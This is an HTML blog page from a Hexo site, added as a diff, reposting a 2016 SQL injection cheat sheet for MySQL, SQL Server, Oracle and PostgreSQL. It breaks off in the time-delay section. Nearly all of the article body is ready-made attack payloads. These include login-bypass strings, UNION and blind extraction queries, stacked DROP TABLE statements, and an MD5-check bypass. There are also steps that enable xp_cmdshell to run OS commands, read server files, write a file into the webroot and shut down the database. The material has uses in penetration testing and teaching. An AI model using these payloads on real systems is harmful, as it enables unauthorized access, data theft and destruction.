@@ -1,0 +1,1053 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>
+
+
+
+
+  <link href="//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=0.5.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="SQL;injection," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/tri.ico?v=0.5.0" />
+
+
+
+
+
+
+<meta name="description" content="What is an SQL Injection Cheat Sheet?
+An SQL injection cheat sheet is a resource in which you can find detailed technical information about the many different variants of the SQL Injection vulnerabili">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL injection cheat sheet">
+<meta property="og:url" content="http://yoursite.com/2016/03/21/SQL-injection-cheat-sheet/index.html">
+<meta property="og:site_name" content="Ariesin">
+<meta property="og:description" content="What is an SQL Injection Cheat Sheet?
+An SQL injection cheat sheet is a resource in which you can find detailed technical information about the many different variants of the SQL Injection vulnerabili">
+<meta property="og:updated_time" content="2016-03-21T08:42:57.166Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL injection cheat sheet">
+<meta name="twitter:description" content="What is an SQL Injection Cheat Sheet?
+An SQL injection cheat sheet is a resource in which you can find detailed technical information about the many different variants of the SQL Injection vulnerabili">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: 'Author'
+    }
+  };
+</script>
+
+  <title> SQL injection cheat sheet | Ariesin </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Ariesin</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                SQL injection cheat sheet
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2016-03-21T16:04:11+08:00" content="2016-03-21">
+              2016-03-21
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/SQL/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>What is an SQL Injection Cheat Sheet?</p>
+<p>An SQL injection cheat sheet is a resource in which you can find detailed technical information about the many different variants of the SQL Injection vulnerability. This cheat sheet is of good reference to both seasoned penetration tester and also those who are just getting started in web application security.<br>About the SQL Injection Cheat Sheet<br><a id="more"></a><br>This SQL injection cheat sheet was originally published in 2007 by Ferruh Mavituna on his blog. We have updated it and moved it over from our CEO’s blog. Currently this SQL Cheat Sheet only contains information for MySQL, Microsoft SQL Server, and some limited information for ORACLE and PostgreSQL SQL servers. Some of the samples in this sheet might not work in every situation because real live environments may vary depending on the usage of parenthesis, different code bases and unexpected, strange and complex SQL sentences. </p>
+<p>Samples are provided to allow you to get basic idea of a potential attack and almost every section includes a brief information about itself.<br><code>M :     MySQL
+S :     SQL Server
+P :     PostgreSQL
+O :     Oracle</code>+ :     Possibly all other databases<br>Examples;</p>
+<pre><code>(MS) means : MySQL and SQL Server etc.
+(M*S) means : Only in some versions of MySQL or special conditions see related note and SQL Server
+</code></pre><p>Table Of Contents</p>
+<pre><code>Syntax Reference, Sample Attacks and Dirty SQL Injection Tricks
+    Line Comments
+        SQL Injection Attack Samples
+    Inline Comments
+        Classical Inline Comment SQL Injection Attack Samples
+        MySQL Version Detection Sample Attacks
+    Stacking Queries
+        Language / Database Stacked Query Support Table
+        About MySQL and PHP
+        Stacked SQL Injection Attack Samples
+    If Statements
+        MySQL If Statement
+        SQL Server If Statement
+        If Statement SQL Injection Attack Samples
+    Using Integers
+    String Operations
+        String Concatenation
+    Strings without Quotes
+        Hex based SQL Injection Samples
+    String Modification &amp; Related
+    Union Injections
+        UNION – Fixing Language Issues
+    Bypassing Login Screens
+    Enabling xp_cmdshell in SQL Server 2005
+    Finding Database Structure in SQL Server
+    Fast way to extract data from Error Based SQL Injections in SQL Server
+    Blind SQL Injections
+    Covering Your Tracks
+    Extra MySQL Notes
+    Second Order SQL Injections
+    Out of Band (OOB) Channel Attacks
+</code></pre><p>Syntax Reference, Sample Attacks and Dirty SQL Injection Tricks<br>Ending / Commenting Out / Line Comments<br>Line Comments</p>
+<p>Comments out rest of the query.<br>``Line comments are generally useful for ignoring rest of the query so you don’t have to deal with fixing the syntax.</p>
+<pre><code>-- (SM) 
+DROP sampletable;-- 
+
+# (M) 
+DROP sampletable;#
+</code></pre><p>``<br>Line Comments Sample SQL Injection Attacks</p>
+<pre><code>Username: admin&apos;--
+SELECT * FROM members WHERE username = &apos;admin&apos;--&apos; AND password = &apos;password&apos; 
+This is going to log you as admin user, because rest of the SQL query will be ignored.
+</code></pre><p>Inline Comments</p>
+<p>Comments out rest of the query by not closing them or you can use for bypassing blacklisting, removing spaces, obfuscating and determining database versions.</p>
+<pre><code>/*Comment Here*/ (SM)
+    DROP/*comment*/sampletable
+    DR/**/OP/*bypass blacklisting*/sampletable
+    SELECT/*avoid-spaces*/password/**/FROM/**/Members
+/*! MYSQL Special SQL */ (M) 
+This is a special comment syntax for MySQL. It’s perfect for detecting MySQL version. If you put a code into this comments it’s going to execute in MySQL only. Also you can use this to execute some code only if the server is higher than supplied version. 
+
+SELECT /*!32302 1/0, */ 1 FROM tablename
+</code></pre><p>Classical Inline Comment SQL Injection Attack Samples</p>
+<pre><code>ID: 10; DROP TABLE members /* 
+Simply get rid of other stuff at the end the of query. Same as 10; DROP TABLE members --
+SELECT /*!32302 1/0, */ 1 FROM tablename 
+Will throw an divison by 0 error if MySQL version is higher than3.23.02
+</code></pre><p>MySQL Version Detection Sample Attacks</p>
+<pre><code>ID: /*!32302 10*/
+ID: 10 
+You will get the same response if MySQL version is higher than 3.23.02
+SELECT /*!32302 1/0, */ 1 FROM tablename 
+Will throw a division by 0 error if MySQL version is higher than3.23.02
+</code></pre><p>Stacking Queries</p>
+<p>Executing more than one query in one transaction. This is very useful in every injection point, especially in SQL Server back ended applications.</p>
+<pre><code>; (S) 
+SELECT * FROM members; DROP members--
+</code></pre><p>Ends a query and starts a new one.<br>Language / Database Stacked Query Support Table</p>
+<p>green: supported, dark gray: not supported, light gray: unknown</p>
+<p>SQL Injection Cheat sheet</p>
+<p>About MySQL and PHP;<br>To clarify some issues;<br>PHP - MySQL doesn’t support stacked queries, Java doesn’t support stacked queries (I’m sure for ORACLE, not quite sure about other databases). Normally MySQL supports stacked queries but because of database layer in most of the configurations it’s not possible to execute a second query in PHP-MySQL applications or maybe MySQL client supports this, not quite sure. Can someone clarify?<br>Stacked SQL Injection Attack Samples</p>
+<pre><code>ID: 10;DROP members --
+SELECT * FROM products WHERE id = 10; DROP members--
+</code></pre><p>This will run DROP members SQL sentence after normal SQL Query.<br>If Statements</p>
+<p>Get response based on a if statement. This is one of the key points of Blind SQL Injection, also can be very useful to test simple stuff blindly andaccurately.<br>MySQL If Statement</p>
+<pre><code>IF(condition,true-part,false-part) (M) 
+SELECT IF(1=1,&apos;true&apos;,&apos;false&apos;)
+</code></pre><p>SQL Server If Statement</p>
+<pre><code>IF condition true-part ELSE false-part (S) 
+IF (1=1) SELECT &apos;true&apos; ELSE SELECT &apos;false&apos;
+</code></pre><p>Oracle If Statement</p>
+<pre><code>BEGIN
+IF condition THEN true-part; ELSE false-part; END IF; END; (O) 
+IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;
+</code></pre><p>PostgreSQL If Statement</p>
+<pre><code>SELECT CASE WHEN condition THEN true-part ELSE false-part END; (P) 
+SELECT CASE WEHEN (1=1) THEN &apos;A&apos; ELSE &apos;B&apos;END;
+</code></pre><p>If Statement SQL Injection Attack Samples</p>
+<p>if ((select user) = ‘sa’ OR (select user) = ‘dbo’) select 1 else select 1/0 (S)<br>This will throw an divide by zero error if current logged user is not “sa” or “dbo”.<br>Using Integers</p>
+<p>Very useful for bypassing, magic_quotes() and similar filters, or even WAFs.</p>
+<pre><code>0xHEXNUMBER (SM) 
+You can  write hex like these; 
+
+SELECT CHAR(0x66) (S) 
+SELECT 0x5045 (this is not an integer it will be a string from Hex) (M) 
+SELECT 0x50 + 0x45 (this is integer now!) (M)
+</code></pre><p>String  Operations</p>
+<p>String related operations. These can be quite useful to build up injections which are not using any quotes, bypass any other black listing or determine back end database.<br>String Concatenation</p>
+<pre><code>+ (S) 
+SELECT login + &apos;-&apos; + password FROM members
+|| (*MO) 
+SELECT login || &apos;-&apos; || password FROM members
+</code></pre><p>*About MySQL “||”;<br>If MySQL is running in ANSI mode it’s going to work but otherwise MySQL accept it as <code>logical operator</code> it’ll return 0. A better way to do it is using CONCAT()function in MySQL.</p>
+<pre><code>CONCAT(str1, str2, str3, ...) (M) 
+Concatenate supplied strings. 
+SELECT CONCAT(login, password) FROM members
+</code></pre><p>Strings without Quotes</p>
+<p>These are some direct ways to using strings but it’s always possible to use CHAR()(MS) and CONCAT()(M) to generate string without quotes.</p>
+<pre><code>0x457578 (M) - Hex Representation of string 
+SELECT 0x457578 
+This will be selected as string in MySQL. 
+
+In MySQL easy way to generate hex representations of strings use this; 
+SELECT CONCAT(&apos;0x&apos;,HEX(&apos;c:\\boot.ini&apos;))
+Using CONCAT() in MySQL 
+SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) (M) 
+This will return ‘KLM’.
+SELECT CHAR(75)+CHAR(76)+CHAR(77) (S) 
+This will return ‘KLM’.
+SELECT CHR(75)||CHR(76)||CHR(77) (O) 
+This will return ‘KLM’.
+SELECT (CHaR(75)||CHaR(76)||CHaR(77)) (P) 
+This will return ‘KLM’.
+</code></pre><p>Hex based SQL Injection Samples</p>
+<pre><code>SELECT LOAD_FILE(0x633A5C626F6F742E696E69) (M) 
+This will show the content of c:\boot.ini
+</code></pre><p>String Modification &amp; Related</p>
+<pre><code>ASCII() (SMP) 
+Returns ASCII character value of leftmost character. A must have function for Blind SQL Injections. 
+
+SELECT ASCII(&apos;a&apos;)
+CHAR() (SM) 
+Convert an integer of ASCII. 
+
+SELECT CHAR(64)
+</code></pre><p>Union Injections</p>
+<p>With union you do SQL queries cross-table. Basically you can poison query to return records from another table.</p>
+<p>SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members<br>This will combine results from both news table and members table and return all of them.</p>
+<p>Another Example:<br>‘ UNION SELECT 1, ‘anotheruser’, ‘doesnt matter’, 1–<br>UNION – Fixing Language Issues</p>
+<p>While exploiting Union injections sometimes you get errors because of different language settings (table settings, field settings, combined table / db settings etc.) these functions are quite useful to fix this problem. It’s rare but if you dealing with Japanese, Russian, Turkish etc. applications then you will see it.</p>
+<pre><code>SQL Server (S) 
+Use field COLLATE SQL_Latin1_General_Cp1254_CS_AS or some other valid one - check out SQL Server documentation. 
+
+SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members
+MySQL (M) 
+Hex() for every possible issue
+</code></pre><p>Bypassing Login Screens (SMO+)</p>
+<p>SQL Injection 101, Login tricks</p>
+<pre><code>admin&apos; --
+admin&apos; #
+admin&apos;/*
+&apos; or 1=1--
+&apos; or 1=1#
+&apos; or 1=1/*
+&apos;) or &apos;1&apos;=&apos;1--
+&apos;) or (&apos;1&apos;=&apos;1--
+....
+
+Login as different user (SM*) 
+&apos; UNION SELECT 1, &apos;anotheruser&apos;, &apos;doesnt matter&apos;, 1--
+</code></pre><p>*Old versions of MySQL doesn’t support union queries<br>Bypassing second MD5 hash check login screens</p>
+<p>If application is first getting the record by username and then compare returned MD5 with supplied password’s MD5 then you need to some extra tricks to fool application to bypass authentication. You can union results with a known password and MD5 hash of supplied password. In this case application will compare your password and your supplied MD5 hash instead of MD5 from database.<br>Bypassing MD5 Hash Check Example (MSP)</p>
+<p>Username : admin<br>Password : 1234 ‘ AND 1=0 UNION ALL SELECT ‘admin’, ‘81dc9bdb52d04dc20036dbd8313ed055</p>
+<p>81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)</p>
+<p>Error Based - Find Columns Names<br>Finding Column Names with HAVING BY - Error Based (S)</p>
+<p>In the same order,</p>
+<pre><code>&apos; HAVING 1=1 --
+&apos; GROUP BY table.columnfromerror1 HAVING 1=1 --
+&apos; GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --
+&apos; GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- and so on
+If you are not getting any more error then it&apos;s done.
+</code></pre><p>Finding how many columns in SELECT query by ORDER BY (MSO+)</p>
+<p>Finding column number by ORDER BY can speed up the UNION SQL Injection process.</p>
+<pre><code>ORDER BY 1--
+ORDER BY 2--
+ORDER BY N-- so on
+Keep going until get an error. Error means you found the number of selected columns.
+</code></pre><p>Data types, UNION, etc.<br>Hints,</p>
+<pre><code>Always use UNION with ALL because of image similar non-distinct field types. By default union tries to get records with distinct.
+To get rid of unrequired records from left table use -1 or any not exist record search in the beginning of query (if injection is in WHERE). This can be critical if you are only getting one result at a time.
+Use NULL in UNION injections for most data type instead of trying to guess string, date, integer etc.
+    Be careful in Blind situtaions may you can understand error is coming from DB or application itself. Because languages like ASP.NET generally throws errors while trying to use NULL values (because normally developers are not expecting to see NULL in a username field)
+</code></pre><p>Finding Column Type</p>
+<pre><code>&apos; union select sum(columntofind) from users-- (S) 
+Microsoft OLE DB Provider for ODBC Drivers error &apos;80040e07&apos; 
+[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument. 
+
+If you are not getting an error it means column is numeric.
+Also you can use CAST() or CONVERT()
+    SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –- 
+No Error - Syntax is right. MS SQL Server Used. Proceeding.
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –- 
+No Error – First column is an integer.
+11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 -- 
+Error! – Second column is not an integer.
+11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –- 
+No Error – Second column is a string.
+11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –- 
+Error! – Third column is not an integer. ... 
+
+Microsoft OLE DB Provider for SQL Server error &apos;80040e07&apos; 
+Explicit conversion from data type int to image is not allowed.
+</code></pre><p>You’ll get convert() errors before union target errors ! So start with convert() then union<br>Simple Insert (MSO+)</p>
+<p>‘; insert into users values( 1, ‘hax0r’, ‘coolpass’, 9 )/*<br>Useful Function / Information Gathering / Stored Procedures / Bulk SQL Injection Notes</p>
+<p>@@version (MS)<br>Version of database and more details for SQL Server. It’s a constant. You can just select it like any other column, you don’t need to supply table name. Also, you can use insert, update statements or in functions.</p>
+<p>INSERT INTO members(id, user, pass) VALUES(1, ‘’+SUBSTRING(@@version,1,10) ,10)<br>Bulk Insert (S)</p>
+<p>Insert a file content to a table. If you don’t know internal path of web application you can read IIS (IIS 6 only) metabase file(%systemroot%\system32\inetsrv\MetaBase.xml) and then search in it to identify application path.</p>
+<pre><code>Create table foo( line varchar(8000) )
+bulk insert foo from &apos;c:\inetpub\wwwroot\login.asp&apos;
+Drop temp table, and repeat for another file.
+</code></pre><p>BCP (S)</p>
+<p>Write text file. Login Credentials are required to use this function.<br>bcp “SELECT * FROM test..foo” queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar<br>VBS, WSH in SQL Server (S)</p>
+<p>You can use VBS, WSH scripting in SQL Server because of ActiveX support.</p>
+<p>declare @o int<br>exec sp_oacreate ‘wscript.shell’, @o out<br>exec sp_oamethod @o, ‘run’, NULL, ‘notepad.exe’<br>Username: ‘; declare @o int exec sp_oacreate ‘wscript.shell’, @o out exec sp_oamethod @o, ‘run’, NULL, ‘notepad.exe’ –<br>Executing system commands, xp_cmdshell (S)</p>
+<p>Well known trick, By default it’s disabled in SQL Server 2005. You need to have admin access.</p>
+<p>EXEC master.dbo.xp_cmdshell ‘cmd.exe dir c:’</p>
+<p>Simple ping check (configure your firewall or sniffer to identify request before launch it),</p>
+<p>EXEC master.dbo.xp_cmdshell ‘ping ‘</p>
+<p>You can not read results directly from error or union or something else.<br>Some Special Tables in SQL Server (S)</p>
+<pre><code>Error Messages 
+master..sysmessages
+Linked Servers 
+master..sysservers
+Password (2000 and 20005 both can be crackable, they use very similar hashing algorithm ) 
+SQL Server 2000: masters..sysxlogins 
+SQL Server 2005 : sys.sql_logins 
+</code></pre><p>More Stored Procedures for SQL Server (S)</p>
+<pre><code>Cmd Execute (xp_cmdshell) 
+exec master..xp_cmdshell &apos;dir&apos;
+Registry Stuff (xp_regread) 
+    xp_regaddmultistring
+    xp_regdeletekey
+    xp_regdeletevalue
+    xp_regenumkeys
+    xp_regenumvalues
+    xp_regread
+    xp_regremovemultistring
+    xp_regwrite 
+    exec xp_regread HKEY_LOCAL_MACHINE, &apos;SYSTEM\CurrentControlSet\Services\lanmanserver\parameters&apos;, &apos;nullsessionshares&apos; 
+    exec xp_regenumvalues HKEY_LOCAL_MACHINE, &apos;SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities&apos;
+Managing Services (xp_servicecontrol)
+Medias (xp_availablemedia)
+ODBC Resources (xp_enumdsn)
+Login mode (xp_loginconfig)
+Creating Cab Files (xp_makecab)
+Domain Enumeration (xp_ntsec_enumdomains)
+Process Killing (need PID) (xp_terminate_process)
+Add new procedure (virtually you can execute whatever you want) 
+sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’ 
+exec xp_webserver
+Write text file to a UNC or an internal path (sp_makewebtask)
+</code></pre><p>MSSQL Bulk Notes</p>
+<p>SELECT <em> FROM master..sysprocesses /</em>WHERE spid=@@SPID*/</p>
+<p>DECLARE @result int; EXEC @result = xp_cmdshell ‘dir *.exe’;IF (@result = 0) SELECT 0 ELSE SELECT 1/0</p>
+<p>HOST_NAME()<br>IS_MEMBER (Transact-SQL)<br>IS_SRVROLEMEMBER (Transact-SQL)<br>OPENDATASOURCE (Transact-SQL)</p>
+<p>INSERT tbl EXEC master..xp_cmdshell OSQL /Q”DBCC SHOWCONTIG”</p>
+<p>OPENROWSET (Transact-SQL)  - <a href="http://msdn2.microsoft.com/en-us/library/ms190312.aspx" target="_blank" rel="external">http://msdn2.microsoft.com/en-us/library/ms190312.aspx</a></p>
+<p>You can not use sub selects in SQL Server Insert queries.<br>SQL Injection in LIMIT (M) or ORDER (MSO)</p>
+<p>SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,’x’/*,10 ;</p>
+<p>If injection is in second limit you can comment it out or use in your union injection<br>Shutdown SQL Server (S)</p>
+<p>When you’re really pissed off, ‘;shutdown –<br>Enabling xp_cmdshell in SQL Server 2005</p>
+<p>By default xp_cmdshell and couple of other potentially dangerous stored procedures are disabled in SQL Server 2005. If you have admin access then you can enable these.</p>
+<p>EXEC sp_configure ‘show advanced options’,1<br>RECONFIGURE</p>
+<p>EXEC sp_configure ‘xp_cmdshell’,1<br>RECONFIGURE<br>Finding Database Structure in SQL Server (S)<br>Getting User defined Tables</p>
+<p>SELECT name FROM sysobjects WHERE xtype = ‘U’<br>Getting Column Names</p>
+<p>SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = ‘tablenameforcolumnnames’)<br>Moving records (S)</p>
+<pre><code>Modify WHERE and use NOT IN or NOT EXIST, 
+... WHERE users NOT IN (&apos;First User&apos;, &apos;Second User&apos;) 
+SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members) -- very good one
+Using Dirty Tricks 
+SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id&lt;=o.id) AS x, name from sysobjects o) as p where p.x=3) as int 
+
+Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype=&apos;U&apos; and i.id&lt;=o.id) AS x, name from sysobjects o WHERE o.xtype = &apos;U&apos;) as p where p.x=21
+</code></pre><p>Fast way to extract data from Error Based SQL Injections in SQL Server (S)</p>
+<p>‘;BEGIN DECLARE @rt varchar(8000) SET @rd=’:’ SELECT @rd=@rd+’ ‘+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = ‘MEMBERS’) AND name&gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;–</p>
+<p>Detailed Article: Fast way to extract data from Error Based SQL Injections<br>Finding Database Structure in MySQL (M)<br>Getting User defined Tables</p>
+<p>SELECT table_name FROM information_schema.tables WHERE table_schema = ‘tablename’<br>Getting Column Names</p>
+<p>SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = ‘tablename’<br>Finding Database Structure in Oracle (O)<br>Getting User defined Tables</p>
+<p>SELECT * FROM all_tables WHERE OWNER = ‘DATABASE_NAME’<br>Getting Column Names</p>
+<p>SELECT * FROM all_col_comments WHERE TABLE_NAME = ‘TABLE’<br>Blind SQL Injections<br>About Blind SQL Injections</p>
+<p>In a quite good production application generally you can not see error responses on the page, so you can not extract data through Union attacks or error based attacks. You have to do use Blind SQL Injections attacks to extract data. There are two kind of Blind Sql Injections.</p>
+<p>Normal Blind, You can not see a response in the page, but you can still determine result of a query from response or HTTP status code<br>Totally Blind, You can not see any difference in the output in any kind. This can be an injection a logging function or similar. Not so common, though.</p>
+<p>In normal blinds you can use if statements or abuse WHERE query in injection (generally easier), in totally blinds you need to use some waiting functions and analyze response times. For this you can use WAIT FOR DELAY ‘0:0:10’ in SQL Server, BENCHMARK() and sleep(10) in MySQL, pg_sleep(10) in PostgreSQL, and some PL/SQL tricks in ORACLE.<br>Real and a bit Complex Blind SQL Injection Attack Sample</p>
+<p>This output taken from a real private Blind SQL Injection tool while exploiting SQL Server back ended application and enumerating table names. This requests done for first char of the first table name. SQL queries a bit more complex then requirement because of automation reasons. In we are trying to determine an ascii value of a char via binary search algorithm.</p>
+<p>TRUE and FALSE flags mark queries returned true or false.</p>
+<p>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;78– </p>
+<p>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;103– </p>
+<p>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<br>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;89– </p>
+<p>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<br>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;83– </p>
+<p>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<br>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;80– </p>
+<p>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)</p>
+<p>Since both of the last 2 queries failed we clearly know table name’s first char’s ascii value is 80 which means first char is <code>P</code>. This is the way to exploit Blind SQL injections by binary search algorithm. Other well-known way is reading data bit by bit. Both can be effective in different conditions.</p>
+<p>Making Databases Wait / Sleep For Blind SQL Injection Attacks</p>
+<p>First of all use this if it’s really blind, otherwise just use 1/0 style errors to identify difference. Second, be careful while using times more than 20-30 seconds. database API connection or script can be timeout.<br>WAIT FOR DELAY ‘time’ (S)</p>
+<p>This is just like sleep, wait for specified time. CPU safe way to make database wait.</p>
+<p>WAITFOR DELAY ‘0:0:10’–</p>
+<p>Also, you can use fractions like this,</p>
+<p>WAITFOR DELAY ‘0:0:0.51’<br>Real World Samples</p>
+<pre><code>Are we &apos;sa&apos; ? 
+if (select user) = &apos;sa&apos; waitfor delay &apos;0:0:10&apos;
+ProductID = 1;waitfor delay &apos;0:0:10&apos;--
+ProductID =1);waitfor delay &apos;0:0:10&apos;--
+ProductID =1&apos;;waitfor delay &apos;0:0:10&apos;--
+ProductID =1&apos;);waitfor delay &apos;0:0:10&apos;--
+ProductID =1));waitfor delay &apos;0:0:10&apos;--
+ProductID =1&apos;));waitfor delay &apos;0:0:10&apos;--
+</code></pre><p>BENCHMARK() (M)</p>
+<p>Basically, we are abusing this command to make MySQL wait a bit. Be careful you will consume web servers limit so fast!</p>
+<p>BENCHMARK(howmanytimes, do this)<br>Real World Samples</p>
+<pre><code>Are we root ? woot! 
+IF EXISTS (SELECT * FROM users WHERE username = &apos;root&apos;) BENCHMARK(1000000000,MD5(1))
+Check Table exist in MySQL 
+IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))
+</code></pre><p>pg_sleep(seconds) (P)</p>
+<p>Sleep for supplied seconds.</p>
+<pre><code>SELECT pg_sleep(10); 
+Sleep 10 seconds.
+</code></pre><p>sleep(seconds) (M)</p>
+<p>Sleep for supplied seconds.</p>
+<pre><code>SELECT sleep(10); 
+Sleep 10 seconds.
+</code></pre><p>dbms_pipe.receive_message (O)</p>
